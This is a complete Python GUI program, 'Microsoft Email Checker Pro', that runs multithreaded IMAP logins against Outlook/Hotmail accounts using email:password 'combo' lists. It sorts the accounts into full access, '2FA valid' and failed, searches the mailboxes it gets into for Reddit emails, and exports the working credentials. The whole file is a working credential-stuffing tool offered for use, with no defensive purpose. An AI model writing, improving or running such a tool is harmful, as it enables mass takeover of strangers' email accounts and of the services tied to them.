#!/usr/bin/env python3
"""
Microsoft Email Checker Pro v3.5 - Final Production Version
Optimized for Hotmail/Outlook/Live accounts with 2FA detection
No external dependencies - uses only Python standard library
"""

import imaplib
import threading
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import time
from datetime import datetime, timedelta
import socket
import ssl
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

class MicrosoftEmailChecker:
    def __init__(self, root):
        self.root = root
        self.root.title("Microsoft Email Checker Pro v3.5")
        self.root.geometry("1250x750")
        self.root.configure(bg='#1a1a1a')
        
        # Try to set window icon (optional)
        try:
            self.root.iconbitmap('microsoft.ico')
        except:
            pass
        
        # Core variables
        self.combo_file = None
        self.running = False
        self.paused = False
        self.start_time = None
        self.total_combos = 0
        
        # Results categories
        self.full_access = []
        self.twofa_valid = []
        self.failed = []
        
        # Counters
        self.checked = 0
        self.success_count = 0
        self.twofa_count = 0
        self.failed_count = 0
        self.skipped_count = 0
        
        # Threading
        self.lock = threading.Lock()
        self.threads = tk.IntVar(value=15)  # Optimal for Microsoft IMAP
        
        # Settings
        self.auto_scroll = tk.BooleanVar(value=True)
        self.quick_mode = tk.BooleanVar(value=False)
        
        # Microsoft domain list (comprehensive)
        self.MICROSOFT_DOMAINS = {
            'hotmail.com', 'outlook.com', 'live.com', 'msn.com',
            'hotmail.co.uk', 'hotmail.fr', 'live.co.uk', 'live.fr',
            'outlook.fr', 'outlook.es', 'outlook.de', 'hotmail.de',
            'live.de', 'hotmail.it', 'live.it', 'passport.com',
            'windowslive.com', 'hotmail.es', 'live.com.mx', 'hotmail.com.mx',
            'hotmail.com.br', 'live.com.br', 'outlook.com.br',
            'hotmail.com.ar', 'live.com.ar', 'outlook.com.ar',
            'hotmail.ca', 'live.ca', 'hotmail.nl', 'live.nl',
            'hotmail.be', 'live.be', 'hotmail.ch', 'hotmail.at'
        }
        
        # IMAP configuration
        self.IMAP_SERVER = 'outlook.office365.com'
        self.IMAP_PORT = 993
        
        # 2FA detection patterns
        self.TWOFA_PATTERNS = [
            'WEBIMAP01',
            'AADSTS50076',
            'AADSTS50079',
            'AADSTS50057',
            'MFA',
            'multi-factor',
            'two-step',
            'additional security',
            'verify your identity',
            '2-step verification',
            'two factor'
        ]
        
        # Build UI
        self.setup_ui()
        self.setup_shortcuts()
        
    def setup_ui(self):
        """Create the professional Microsoft-focused UI"""
        
        # Main container
        main_container = tk.Frame(self.root, bg='#1a1a1a')
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Header
        header_frame = tk.Frame(main_container, bg='#1a1a1a')
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Title with Microsoft colors
        title_label = tk.Label(header_frame, 
                              text="Microsoft Email Checker Pro", 
                              font=("Segoe UI", 20, "bold"),
                              fg='#00bcf2', bg='#1a1a1a')
        title_label.pack(side=tk.LEFT)
        
        subtitle = tk.Label(header_frame,
                           text="v3.5 - Hotmail/Outlook/Live Optimized",
                           font=("Segoe UI", 10),
                           fg='#888888', bg='#1a1a1a')
        subtitle.pack(side=tk.LEFT, padx=(20, 0))
        
        # Control panel
        control_frame = tk.Frame(main_container, bg='#2d2d2d', relief=tk.RIDGE, bd=1)
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        # File selection
        file_frame = tk.Frame(control_frame, bg='#2d2d2d')
        file_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Button(file_frame, text="📁 Select Combo File",
                 command=self.select_file,
                 bg='#0078d4', fg='white',
                 font=("Segoe UI", 10, "bold"),
                 padx=15, pady=8,
                 relief=tk.FLAT,
                 cursor='hand2').pack(side=tk.LEFT)
        
        self.file_label = tk.Label(file_frame,
                                  text="No file selected",
                                  font=("Segoe UI", 10),
                                  fg='#aaaaaa', bg='#2d2d2d')
        self.file_label.pack(side=tk.LEFT, padx=(15, 0))
        
        # Settings
        settings_frame = tk.Frame(control_frame, bg='#2d2d2d')
        settings_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        tk.Label(settings_frame, text="Threads:",
                font=("Segoe UI", 9),
                fg='white', bg='#2d2d2d').pack(side=tk.LEFT)
        
        thread_spin = tk.Spinbox(settings_frame, from_=5, to=30,
                                textvariable=self.threads,
                                width=5, font=("Segoe UI", 9))
        thread_spin.pack(side=tk.LEFT, padx=(5, 20))
        
        tk.Checkbutton(settings_frame, text="Quick Mode (Skip 2FA faster)",
                      variable=self.quick_mode,
                      fg='white', bg='#2d2d2d',
                      selectcolor='#2d2d2d').pack(side=tk.LEFT, padx=(20, 0))
        
        tk.Label(settings_frame, text="(Microsoft accounts only)",
                font=("Segoe UI", 9, "italic"),
                fg='#ffb900', bg='#2d2d2d').pack(side=tk.RIGHT, padx=10)
        
        # Statistics cards
        stats_frame = tk.Frame(main_container, bg='#1a1a1a')
        stats_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Full Access card
        success_card = tk.Frame(stats_frame, bg='#107c10', relief=tk.RIDGE, bd=1)
        success_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        tk.Label(success_card, text="✅ Full Access",
                font=("Segoe UI", 9),
                fg='white', bg='#107c10').pack(pady=(5,0))
        self.success_label = tk.Label(success_card, text="0",
                                     font=("Segoe UI", 18, "bold"),
                                     fg='white', bg='#107c10')
        self.success_label.pack(pady=(0,5))
        
        # 2FA Valid card
        twofa_card = tk.Frame(stats_frame, bg='#0078d4', relief=tk.RIDGE, bd=1)
        twofa_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        tk.Label(twofa_card, text="🔐 2FA Valid",
                font=("Segoe UI", 9),
                fg='white', bg='#0078d4').pack(pady=(5,0))
        self.twofa_label = tk.Label(twofa_card, text="0",
                                   font=("Segoe UI", 18, "bold"),
                                   fg='white', bg='#0078d4')
        self.twofa_label.pack(pady=(0,5))
        
        # Failed card
        failed_card = tk.Frame(stats_frame, bg='#d13438', relief=tk.RIDGE, bd=1)
        failed_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        tk.Label(failed_card, text="❌ Failed",
                font=("Segoe UI", 9),
                fg='white', bg='#d13438').pack(pady=(5,0))
        self.failed_label = tk.Label(failed_card, text="0",
                                    font=("Segoe UI", 18, "bold"),
                                    fg='white', bg='#d13438')
        self.failed_label.pack(pady=(0,5))
        
        # Progress card
        progress_card = tk.Frame(stats_frame, bg='#5d5d5d', relief=tk.RIDGE, bd=1)
        progress_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0))
        tk.Label(progress_card, text="📊 Progress",
                font=("Segoe UI", 9),
                fg='white', bg='#5d5d5d').pack(pady=(5,0))
        self.progress_text = tk.Label(progress_card, text="0/0",
                                     font=("Segoe UI", 18, "bold"),
                                     fg='white', bg='#5d5d5d')
        self.progress_text.pack(pady=(0,5))
        
        # Progress bar
        progress_frame = tk.Frame(main_container, bg='#1a1a1a')
        progress_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.progress_bar = ttk.Progressbar(progress_frame, 
                                           length=900,
                                           mode='determinate')
        self.progress_bar.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        self.percent_label = tk.Label(progress_frame, text="0%",
                                     font=("Segoe UI", 10, "bold"),
                                     fg='#00bcf2', bg='#1a1a1a')
        self.percent_label.pack(side=tk.LEFT, padx=(10, 0))
        
        self.speed_label = tk.Label(progress_frame, text="0/min",
                                   font=("Segoe UI", 9),
                                   fg='#888888', bg='#1a1a1a')
        self.speed_label.pack(side=tk.LEFT, padx=(10, 0))
        
        # SPLIT PANEL
        split_container = tk.Frame(main_container, bg='#1a1a1a')
        split_container.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # LEFT PANEL - Activity log
        left_panel = tk.Frame(split_container, bg='#2d2d2d', relief=tk.RIDGE, bd=1)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        left_header = tk.Frame(left_panel, bg='#404040')
        left_header.pack(fill=tk.X)
        
        tk.Label(left_header, text="📝 ACTIVITY LOG",
                font=("Segoe UI", 10, "bold"),
                fg='white', bg='#404040').pack(side=tk.LEFT, padx=10, pady=5)
        
        tk.Checkbutton(left_header, text="Auto-scroll",
                      variable=self.auto_scroll,
                      fg='white', bg='#404040',
                      selectcolor='#404040').pack(side=tk.RIGHT, padx=10)
        
        self.log_text = scrolledtext.ScrolledText(left_panel,
                                                  bg='#1e1e1e', fg='#cccccc',
                                                  font=("Consolas", 9),
                                                  height=20, width=55,
                                                  wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
        
        # RIGHT PANEL - Split success results
        right_panel = tk.Frame(split_container, bg='#2d2d2d', relief=tk.RIDGE, bd=1)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        
        # Full Access section
        access_header = tk.Frame(right_panel, bg='#107c10')
        access_header.pack(fill=tk.X)
        
        self.access_title = tk.Label(access_header, text="✅ FULL ACCESS (0)",
                                    font=("Segoe UI", 10, "bold"),
                                    fg='white', bg='#107c10')
        self.access_title.pack(side=tk.LEFT, padx=10, pady=5)
        
        tk.Button(access_header, text="Copy",
                 command=self.copy_full_access,
                 bg='#0e5a0e', fg='white',
                 font=("Segoe UI", 8),
                 relief=tk.FLAT,
                 cursor='hand2').pack(side=tk.RIGHT, padx=10, pady=3)
        
        self.access_text = scrolledtext.ScrolledText(right_panel,
                                                     bg='#0d4f0d', fg='#90ff90',
                                                     font=("Consolas", 10),
                                                     height=10, width=50,
                                                     wrap=tk.NONE)
        self.access_text.pack(fill=tk.BOTH, expand=True, padx=1, pady=(0,5))
        
        # 2FA Valid section
        twofa_header = tk.Frame(right_panel, bg='#0078d4')
        twofa_header.pack(fill=tk.X)
        
        self.twofa_title = tk.Label(twofa_header, text="🔐 2FA VALID (0)",
                                   font=("Segoe UI", 10, "bold"),
                                   fg='white', bg='#0078d4')
        self.twofa_title.pack(side=tk.LEFT, padx=10, pady=5)
        
        tk.Button(twofa_header, text="Copy",
                 command=self.copy_twofa,
                 bg='#005a9e', fg='white',
                 font=("Segoe UI", 8),
                 relief=tk.FLAT,
                 cursor='hand2').pack(side=tk.RIGHT, padx=10, pady=3)
        
        self.twofa_text = scrolledtext.ScrolledText(right_panel,
                                                    bg='#003d6d', fg='#90d4ff',
                                                    font=("Consolas", 10),
                                                    height=10, width=50,
                                                    wrap=tk.NONE)
        self.twofa_text.pack(fill=tk.BOTH, expand=True, padx=1, pady=(0,1))
        
        # Control buttons
        button_frame = tk.Frame(main_container, bg='#1a1a1a')
        button_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.start_btn = tk.Button(button_frame, text="▶️ Start",
                                  command=self.start_checking,
                                  bg='#107c10', fg='white',
                                  font=("Segoe UI", 11, "bold"),
                                  padx=25, pady=10,
                                  relief=tk.FLAT,
                                  cursor='hand2',
                                  state=tk.DISABLED)
        self.start_btn.pack(side=tk.LEFT, padx=2)
        
        self.pause_btn = tk.Button(button_frame, text="⏸️ Pause",
                                  command=self.toggle_pause,
                                  bg='#ffb900', fg='black',
                                  font=("Segoe UI", 11, "bold"),
                                  padx=25, pady=10,
                                  relief=tk.FLAT,
                                  cursor='hand2',
                                  state=tk.DISABLED)
        self.pause_btn.pack(side=tk.LEFT, padx=2)
        
        self.stop_btn = tk.Button(button_frame, text="⏹️ Stop",
                                 command=self.stop_checking,
                                 bg='#d13438', fg='white',
                                 font=("Segoe UI", 11, "bold"),
                                 padx=25, pady=10,
                                 relief=tk.FLAT,
                                 cursor='hand2',
                                 state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=2)
        
        tk.Button(button_frame, text="💾 Export All",
                 command=self.export_all,
                 bg='#0078d4', fg='white',
                 font=("Segoe UI", 11, "bold"),
                 padx=25, pady=10,
                 relief=tk.FLAT,
                 cursor='hand2').pack(side=tk.LEFT, padx=2)
        
        tk.Button(button_frame, text="🗑️ Clear",
                 command=self.clear_all,
                 bg='#5d5d5d', fg='white',
                 font=("Segoe UI", 11, "bold"),
                 padx=25, pady=10,
                 relief=tk.FLAT,
                 cursor='hand2').pack(side=tk.LEFT, padx=2)
        
        # Status bar
        self.status_bar = tk.Label(main_container,
                                  text="Status: Ready | Microsoft Email Checker",
                                  font=("Segoe UI", 9),
                                  fg='#888888', bg='#1a1a1a',
                                  anchor=tk.W)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        
    def setup_shortcuts(self):
        """Setup keyboard shortcuts"""
        self.root.bind('<Control-o>', lambda e: self.select_file())
        self.root.bind('<Control-s>', lambda e: self.export_all())
        self.root.bind('<space>', lambda e: self.toggle_pause() if self.running else None)
        self.root.bind('<Escape>', lambda e: self.stop_checking())
        
    def select_file(self):
        """Select and validate combo file"""
        filename = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if not filename:
            return
            
        self.combo_file = filename
        microsoft_count = 0
        other_count = 0
        invalid_count = 0
        
        # Analyze file
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if ':' in line:
                        try:
                            email = line.split(':')[0].strip().lower()
                            if '@' in email:
                                domain = email.split('@')[1]
                                # Check if it's a Microsoft domain
                                is_microsoft = False
                                for ms_domain in self.MICROSOFT_DOMAINS:
                                    if domain.endswith(ms_domain):
                                        is_microsoft = True
                                        break
                                
                                if is_microsoft:
                                    microsoft_count += 1
                                else:
                                    other_count += 1
                            else:
                                invalid_count += 1
                        except:
                            invalid_count += 1
                    else:
                        invalid_count += 1
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read file: {str(e)}")
            return
        
        self.total_combos = microsoft_count
        
        # Update UI
        self.file_label.config(
            text=f"{os.path.basename(filename)} | MS: {microsoft_count:,} | Other: {other_count:,}"
        )
        
        if other_count > 0:
            self.log(f"⚠️ Found {other_count:,} non-Microsoft emails (will be skipped)", "warning")
        
        if microsoft_count == 0:
            messagebox.showwarning("No Microsoft Emails", 
                                  "No Microsoft emails found!\n"
                                  "This tool only supports Hotmail/Outlook/Live accounts.")
            return
            
        self.start_btn.config(state=tk.NORMAL)
        self.log(f"✅ Loaded {microsoft_count:,} Microsoft accounts", "success")
        
    def log(self, message, level="info"):
        """Add timestamped, color-coded message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Format and color based on level
        colors = {
            "success": "#90ff90",
            "twofa": "#90d4ff",
            "error": "#ff9090",
            "warning": "#ffb900",
            "info": "#cccccc"
        }
        
        color = colors.get(level, "#cccccc")
        formatted = f"[{timestamp}] {message}\n"
        
        self.log_text.insert(tk.END, formatted, level)
        self.log_text.tag_config(level, foreground=color)
        
        if self.auto_scroll.get():
            self.log_text.see(tk.END)
        
        self.root.update_idletasks()
        
    def update_stats(self):
        """Update all statistics displays"""
        with self.lock:
            # Update labels
            self.success_label.config(text=str(self.success_count))
            self.twofa_label.config(text=str(self.twofa_count))
            self.failed_label.config(text=str(self.failed_count))
            self.progress_text.config(text=f"{self.checked:,}/{self.total_combos:,}")
            
            # Update titles
            self.access_title.config(text=f"✅ FULL ACCESS ({self.success_count})")
            self.twofa_title.config(text=f"🔐 2FA VALID ({self.twofa_count})")
            
            # Progress bar
            if self.total_combos > 0:
                progress = (self.checked / self.total_combos) * 100
                self.progress_bar['value'] = progress
                self.percent_label.config(text=f"{progress:.1f}%")
            
            # Speed calculation
            if self.start_time and self.checked > 0:
                elapsed = time.time() - self.start_time
                speed = (self.checked / elapsed) * 60  # per minute
                self.speed_label.config(text=f"{speed:.0f}/min")
                
                # ETA
                remaining = self.total_combos - self.checked
                if speed > 0:
                    eta_seconds = (remaining / speed) * 60
                    eta = str(timedelta(seconds=int(eta_seconds)))
                    self.status_bar.config(
                        text=f"Status: Running | Speed: {speed:.0f}/min | ETA: {eta}"
                    )
    
    def check_email(self, email_addr, password):
        """Check Microsoft email with 2FA detection"""
        try:
            # Verify it's a Microsoft domain
            domain = email_addr.split('@')[1].lower()
            is_microsoft = False
            for ms_domain in self.MICROSOFT_DOMAINS:
                if domain.endswith(ms_domain):
                    is_microsoft = True
                    break
            
            if not is_microsoft:
                with self.lock:
                    self.skipped_count += 1
                return "SKIPPED"
            
            # Setup connection with timeout
            socket.setdefaulttimeout(8)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Connect to Microsoft IMAP
            mail = imaplib.IMAP4_SSL(self.IMAP_SERVER, self.IMAP_PORT, ssl_context=context)
            
            # Attempt login
            mail.login(email_addr, password)
            
            # Success! Check for Reddit emails
            mail.select('inbox')
            
            # Search for Reddit emails
            result, data = mail.search(None, '(FROM "reddit")')
            reddit_found = bool(data[0])
            
            if not reddit_found:
                result, data = mail.search(None, '(FROM "noreply@reddit")')
                reddit_found = bool(data[0])
            
            mail.logout()
            
            # Full success
            with self.lock:
                self.success_count += 1
                self.full_access.append(f"{email_addr}:{password}")
                
            # Add to UI
            self.access_text.insert(tk.END, f"{email_addr}:{password}\n")
            self.access_text.see(tk.END)
            
            reddit_status = " [+Reddit]" if reddit_found else ""
            self.log(f"SUCCESS: {email_addr}{reddit_status}", "success")
            
            return "SUCCESS"
            
        except imaplib.IMAP4.error as e:
            error_str = str(e).upper()
            
            # Check for 2FA indicators
            is_2fa = False
            for pattern in self.TWOFA_PATTERNS:
                if pattern.upper() in error_str:
                    is_2fa = True
                    break
            
            if is_2fa:
                # 2FA detected - password is correct
                with self.lock:
                    self.twofa_count += 1
                    self.twofa_valid.append(f"{email_addr}:{password}")
                
                # Add to UI
                self.twofa_text.insert(tk.END, f"{email_addr}:{password}\n")
                self.twofa_text.see(tk.END)
                
                self.log(f"2FA VALID: {email_addr} (password correct, 2FA enabled)", "twofa")
                return "2FA"
                
            elif "AUTHENTICATIONFAILED" in error_str or "INVALID" in error_str:
                # Wrong password
                with self.lock:
                    self.failed_count += 1
                    self.failed.append(email_addr)
                
                self.log(f"Failed: {email_addr}", "error")
                return "FAILED"
                
            else:
                # Other error
                with self.lock:
                    self.failed_count += 1
                return "ERROR"
                
        except socket.timeout:
            with self.lock:
                self.failed_count += 1
            self.log(f"Timeout: {email_addr}", "error")
            return "TIMEOUT"
            
        except Exception as e:
            with self.lock:
                self.failed_count += 1
            return "ERROR"
    
    def worker(self, combo):
        """Worker thread for checking accounts"""
        if not self.running:
            return
            
        while self.paused and self.running:
            time.sleep(0.1)
            
        try:
            parts = combo.strip().split(':')
            if len(parts) >= 2:
                email = parts[0].strip()
                password = ':'.join(parts[1:]).strip()  # Handle passwords with colons
                
                result = self.check_email(email, password)
                
                # Quick mode: minimal delay on 2FA
                if self.quick_mode.get() and result == "2FA":
                    time.sleep(0.1)
                else:
                    time.sleep(0.3)
                    
        except:
            pass
        finally:
            with self.lock:
                self.checked += 1
            self.update_stats()
    
    def start_checking(self):
        """Start the checking process"""
        if self.running:
            return
            
        # Reset counters
        self.checked = 0
        self.success_count = 0
        self.twofa_count = 0
        self.failed_count = 0
        self.skipped_count = 0
        
        # Clear results
        self.full_access.clear()
        self.twofa_valid.clear()
        self.failed.clear()
        
        # Clear displays
        self.access_text.delete(1.0, tk.END)
        self.twofa_text.delete(1.0, tk.END)
        
        # Set state
        self.running = True
        self.paused = False
        self.start_time = time.time()
        
        # Update buttons
        self.start_btn.config(state=tk.DISABLED)
        self.pause_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.NORMAL)
        
        # Load combos (Microsoft only)
        combos = []
        with open(self.combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if ':' in line:
                    try:
                        email = line.split(':')[0].strip().lower()
                        if '@' in email:
                            domain = email.split('@')[1]
                            for ms_domain in self.MICROSOFT_DOMAINS:
                                if domain.endswith(ms_domain):
                                    combos.append(line.strip())
                                    break
                    except:
                        continue
        
        self.log(f"Starting check: {len(combos):,} accounts, {self.threads.get()} threads", "info")
        
        # Start thread pool
        def run_checks():
            with ThreadPoolExecutor(max_workers=self.threads.get()) as executor:
                futures = [executor.submit(self.worker, combo) for combo in combos]
                
                for future in as_completed(futures):
                    if not self.running:
                        executor.shutdown(wait=False)
                        break
            
            if self.running:
                self.complete()
        
        thread = threading.Thread(target=run_checks, daemon=True)
        thread.start()
    
    def toggle_pause(self):
        """Toggle pause state"""
        if not self.running:
            return
            
        self.paused = not self.paused
        
        if self.paused:
            self.pause_btn.config(text="▶️ Resume", bg='#107c10')
            self.status_bar.config(text="Status: Paused")
            self.log("Checking paused", "warning")
        else:
            self.pause_btn.config(text="⏸️ Pause", bg='#ffb900')
            self.status_bar.config(text="Status: Resuming...")
            self.log("Checking resumed", "info")
    
    def stop_checking(self):
        """Stop checking process"""
        self.running = False
        self.paused = False
        
        self.start_btn.config(state=tk.NORMAL)
        self.pause_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.DISABLED)
        
        self.status_bar.config(text="Status: Stopped by user")
        self.log("Checking stopped", "warning")
    
    def complete(self):
        """Called when checking completes"""
        self.running = False
        
        # Update UI
        self.start_btn.config(state=tk.NORMAL)
        self.pause_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.DISABLED)
        
        # Summary
        elapsed = time.time() - self.start_time
        self.log("="*50, "info")
        self.log(f"COMPLETE! Processed {self.checked:,} accounts in {elapsed:.1f}s", "success")
        self.log(f"✅ Full Access: {self.success_count} accounts", "success")
        self.log(f"🔐 2FA Valid: {self.twofa_count} accounts", "twofa")
        self.log(f"❌ Failed: {self.failed_count} accounts", "error")
        
        self.status_bar.config(
            text=f"Complete | Full: {self.success_count} | 2FA: {self.twofa_count} | Failed: {self.failed_count}"
        )
    
    def export_all(self):
        """Export all results to 3 separate files"""
        if not any([self.full_access, self.twofa_valid, self.failed]):
            messagebox.showinfo("No Results", "No results to export")
            return
        
        # Ask for directory
        directory = filedialog.askdirectory(title="Select Export Directory")
        if not directory:
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        exported = []
        
        # Export full access
        if self.full_access:
            filename = os.path.join(directory, f"full_access_{timestamp}.txt")
            with open(filename, 'w') as f:
                for account in self.full_access:
                    f.write(f"{account}\n")
            exported.append(f"Full Access: {len(self.full_access)} accounts")
        
        # Export 2FA valid
        if self.twofa_valid:
            filename = os.path.join(directory, f"2fa_valid_{timestamp}.txt")
            with open(filename, 'w') as f:
                for account in self.twofa_valid:
                    f.write(f"{account}\n")
            exported.append(f"2FA Valid: {len(self.twofa_valid)} accounts")
        
        # Export failed
        if self.failed:
            filename = os.path.join(directory, f"failed_{timestamp}.txt")
            with open(filename, 'w') as f:
                for email in self.failed:
                    f.write(f"{email}\n")
            exported.append(f"Failed: {len(self.failed)} accounts")
        
        self.log(f"✅ Exported to {directory}", "success")
        for exp in exported:
            self.log(f"  • {exp}", "info")
    
    def copy_full_access(self):
        """Copy full access accounts to clipboard"""
        content = self.access_text.get(1.0, tk.END).strip()
        if content:
            self.root.clipboard_clear()
            self.root.clipboard_append(content)
            self.log("Copied full access accounts to clipboard", "success")
    
    def copy_twofa(self):
        """Copy 2FA valid accounts to clipboard"""
        content = self.twofa_text.get(1.0, tk.END).strip()
        if content:
            self.root.clipboard_clear()
            self.root.clipboard_append(content)
            self.log("Copied 2FA valid accounts to clipboard", "success")
    
    def clear_all(self):
        """Clear all results and logs"""
        if self.running:
            messagebox.showwarning("Cannot Clear", "Stop checking first")
            return
            
        if messagebox.askyesno("Clear All", "Clear all results and logs?"):
            # Clear texts
            self.log_text.delete(1.0, tk.END)
            self.access_text.delete(1.0, tk.END)
            self.twofa_text.delete(1.0, tk.END)
            
            # Reset counters
            self.checked = 0
            self.success_count = 0
            self.twofa_count = 0
            self.failed_count = 0
            
            # Clear lists
            self.full_access.clear()
            self.twofa_valid.clear()
            self.failed.clear()
            
            # Update display
            self.update_stats()
            self.status_bar.config(text="Status: Cleared")

def main():
    root = tk.Tk()
    app = MicrosoftEmailChecker(root)
    root.mainloop()

if __name__ == "__main__":
    main()